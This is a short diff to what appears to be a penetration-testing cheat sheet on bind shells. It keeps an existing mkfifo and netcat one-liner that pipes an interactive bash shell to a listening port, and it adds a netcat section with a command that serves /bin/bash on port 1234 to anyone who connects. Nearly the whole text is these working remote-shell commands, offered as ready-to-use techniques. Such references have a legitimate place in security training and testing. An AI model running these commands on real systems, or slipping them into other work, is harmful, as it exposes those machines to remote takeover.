@@ -24,6 +24,12 @@ In a bind-shell the attacking machine initiates a connection to a listener port 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 ```
 
+### netcat
+
+```shell-session
+nc -lvp 1234 -e /bin/bash
+```
+
 ###  python
 
 ```python
